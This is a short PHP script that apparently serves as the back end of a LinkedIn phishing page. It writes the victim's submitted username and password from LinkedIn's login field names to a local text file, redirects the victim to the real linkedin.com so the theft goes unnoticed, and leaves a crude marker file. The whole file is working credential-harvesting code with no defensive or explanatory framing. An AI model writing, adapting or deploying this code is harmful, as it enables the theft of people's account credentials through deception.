<?php

file_put_contents("usernames.txt", "Account: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://linkedin.com');file_put_contents(".scammed","Fucked", FILE_APPEND);
exit();
